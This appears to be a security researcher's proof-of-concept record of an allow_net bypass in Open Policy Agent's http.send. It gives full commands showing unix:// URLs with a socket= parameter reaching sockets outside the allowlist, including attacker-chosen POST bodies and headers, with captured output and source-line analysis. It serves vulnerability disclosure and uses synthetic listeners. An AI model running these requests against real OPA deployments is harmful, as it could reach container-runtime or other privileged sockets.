@@ -1,0 +1,156 @@
+opa — Lead 1 — ATTACK RUN
+`allow_net` does not restrict `unix://` destinations in `http.send`: any single allowed
+hostname reaches any UNIX socket the OPA process can open.
+
+Target      : open-policy-agent/opa
+Pinned tag  : v1.21.0
+Pinned SHA  : dc6269f2c648bbbece4b76fa1fc3dbb7b61cc7b6
+Image digest: sha256:9e0010512cf405e66bfd7b89394f514e56fe0464822df0527e780344ab151450
+Image commit: dc6269f2c648bbbece4b76fa1fc3dbb7b61cc7b6-dirty  (== the pinned SHA)
+Captured    : 2026-09-27T00:42:13Z
+Marker      : B = CVEHUNT-1-87B0BCF6-B (the destination OUTSIDE the allowlist)
+
+Same capabilities file as control rows C1 and C2: allow_net = ["allowed.example.com"].
+Same container image, same flags. The only difference from ROW C2 is the URL authority.
+
+The container runs with `--network none`: no network namespace at all. The destination is
+reached anyway, because useSocket replaces the transport's DialContext and both the network
+and the address argument are discarded (v1/topdown/http.go:396-398).
+
+================================================================================
+ROW A — THE CROSSING
+================================================================================
+
+$ docker run --rm --network none -v $LAB:/w openpolicyagent/opa:1.21.0 \
+    eval --capabilities /w/caps-allow-example.json --strict-builtin-errors -f json \
+    'resp = http.send({"method":"get","url":"unix://allowed.example.com/CVEHUNT-1-87B0BCF6-B-A-bypass?socket=%2Fw%2Fprobe.sock"})'
+
+RESPONSE returned into Rego (verbatim from the -f json output):
+{
+  "status_code": 200,
+  "raw_body": "{\"marker\":\"CVEHUNT-1-87B0BCF6-B-unixsock-hit\"}",
+  "headers": {
+    "content-length": [
+      "46"
+    ],
+    "content-type": [
+      "application/json"
+    ]
+  }
+}
+
+The socket's marked body came back INTO THE POLICY. This is not blind: the policy reads the
+full response of a request to a destination the allowlist never named.
+
+Bytes received at the UNIX socket, verbatim, from the receiver's own log:
+b'GET /CVEHUNT-1-87B0BCF6-B-A-bypass HTTP/1.1\r\nHost: allowed.example.com\r\nUser-Agent: Go-http-client/1.1\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'
+
+The `Host:` header is the allowed authority, which is all the authority ever became: the
+value that satisfied verifyURLHost at v1/topdown/http.go:475 travelled no further than a
+request header, while the destination came from the `socket=` query parameter.
+
+================================================================================
+ROW A2 — CHARACTERISING THE CROSSING
+Attacker-chosen method, headers and body all arrive. This is what separates "reachable"
+from "exploitable" for a container-runtime socket, which needs POST plus a JSON body.
+================================================================================
+
+$ docker run --rm --network none -v $LAB:/w openpolicyagent/opa:1.21.0 \
+    eval --capabilities /w/caps-allow-example.json --strict-builtin-errors -f json \
+    'resp = http.send({"method":"post",
+                       "url":"unix://allowed.example.com/CVEHUNT-1-87B0BCF6-B-A2-post?socket=%2Fw%2Fprobe.sock",
+                       "headers":{"X-Cvehunt":"CVEHUNT-1-87B0BCF6-B-A2-header","Content-Type":"application/json"},
+                       "raw_body":"{\"cvehunt\":\"CVEHUNT-1-87B0BCF6-B-A2-body\"}"})'
+
+RESPONSE returned into Rego:
+{
+  "status_code": 200,
+  "raw_body": "{\"marker\":\"CVEHUNT-1-87B0BCF6-B-unixsock-hit\"}"
+}
+
+Bytes received at the UNIX socket, verbatim:
+b'POST /CVEHUNT-1-87B0BCF6-B-A2-post HTTP/1.1\r\nHost: allowed.example.com\r\nUser-Agent: Open-Policy-Agent/1.21.0 (linux, amd64)\r\nContent-Length: 42\r\nContent-Type: application/json\r\nX-Cvehunt: CVEHUNT-1-87B0BCF6-B-A2-header\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n{"cvehunt":"CVEHUNT-1-87B0BCF6-B-A2-body"}'
+
+Method, custom header and request body all arrived unaltered.
+
+================================================================================
+ROW S — THE GO SDK / EMBEDDER PATH
+The same crossing through `rego.Capabilities(...)` rather than `--capabilities`.
+This is the surface the docs name alongside the CLI, and the one that matters most: a
+service evaluating policy it did not author. Two controls travel with it.
+================================================================================
+
+A Go program built against `github.com/open-policy-agent/opa v1.21.0`, statically linked,
+run with `--network none`. Full source at <LAB>/sdk/main.go.
+The sandbox is expressed exactly as an embedder would:
+
+	caps := ast.CapabilitiesForThisVersion()
+	caps.AllowNet = allowNet
+	r := rego.New(
+		rego.Query(query),
+		rego.Capabilities(caps),
+		rego.StrictBuiltinErrors(true),
+	)
+
+$ docker run --rm --network none -v $LAB:/w --entrypoint /w/sdk/probe alpine:3.20
+
+---- SDK CONTROL — authority not in allow_net
+     allow_net = ["allowed.example.com"]
+     query     = resp = http.send({"method":"get","url":"unix://notallowed.example.com/CVEHUNT-1-87B0BCF6-B-SDK-C?socket=%2Fw%2Fprobe.sock"})
+     ERROR     = http.send({"method":"get","url":"unix://notallowed.example.com/CVEHUNT-1-87B0BCF6-B-SDK-C?socket=%2Fw%2Fprobe.sock"}): eval_builtin_error: http.send: disallowed host: notallowed.example.com
+---- SDK CONTROL — allow_net is empty
+     allow_net = []
+     query     = resp = http.send({"method":"get","url":"unix://allowed.example.com/CVEHUNT-1-87B0BCF6-B-SDK-C2?socket=%2Fw%2Fprobe.sock"})
+     ERROR     = http.send({"method":"get","url":"unix://allowed.example.com/CVEHUNT-1-87B0BCF6-B-SDK-C2?socket=%2Fw%2Fprobe.sock"}): eval_builtin_error: http.send: disallowed host: allowed.example.com
+---- SDK ATTACK — allowed authority, disallowed socket destination
+     allow_net = ["allowed.example.com"]
+     query     = resp = http.send({"method":"get","url":"unix://allowed.example.com/CVEHUNT-1-87B0BCF6-B-SDK-A?socket=%2Fw%2Fprobe.sock"})
+     status_code = 200
+     raw_body    = {"marker":"CVEHUNT-1-87B0BCF6-B-unixsock-hit"}
+
+Bytes received at the UNIX socket during the three rows, verbatim — one line, from the
+attack row only:
+b'GET /CVEHUNT-1-87B0BCF6-B-SDK-A HTTP/1.1\r\nHost: allowed.example.com\r\nUser-Agent: Go-http-client/1.1\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'
+
+Both controls refuse. The attack row returns status_code=200 and the socket's marked body.
+`ast.CapabilitiesForThisVersion()` never assigns AllowNet, so an embedder that does not set
+it has no restriction at all; one that does set it has no restriction on this destination
+kind. The behaviour is identical to the CLI because the enforcement point is the same
+function, v1/topdown/http.go:409-423.
+
+================================================================================
+WHERE THE CHECK SHOULD HAVE BEEN
+================================================================================
+
+v1/topdown/http.go:629-632 — the destination is rewritten out of the `socket=` query
+parameter and the result is never re-verified against the allowlist:
+
+	var transport *http.Transport
+	if ok, parsedURL, tr := useSocket(url); ok {
+		transport = tr
+		url = parsedURL
+
+`allow_net` is consulted at exactly two points, both on the URL authority only:
+  v1/topdown/http.go:475 — the caller-supplied "url" key
+  v1/topdown/http.go:648 — the CheckRedirect hook
+
+and `verifyURLHost` (v1/topdown/http.go:409-423) reads `parsedURL.Host`, which for a
+`unix://` URL does not determine the destination at all.
+
+`socket` has exactly one consumer in the whole tree — `useSocket` itself
+(grep '"socket"\|socket=' over v1/topdown/ returns only http.go:366,367,389,390) — so there
+is no second enforcement point and no normalisation of the path.
+
+================================================================================
+SCOPE AND CONFIGURATION, STATED PLAINLY
+================================================================================
+
+- Synthetic receivers only. The UNIX socket is a purpose-built Python listener that logs
+  what it receives; no real container-runtime or agent socket was ever a destination.
+- No non-default exposure. The unix:// rows ran with `--network none`; the TCP sidecar
+  publishes nothing to the host (`.NetworkSettings.Ports` == {}).
+- One request per row. The finding is that a request reached a destination the allowlist
+  excluded; ROW A2 characterises the request shape and nothing further was extracted.
+- The `allow_net` key was added to `opa capabilities --current` by hand because OPA emits
+  no such key and offers no flag for it. That is the documented way to use the feature
+  (docs/docs/operations.md:138-147), not a lab workaround.
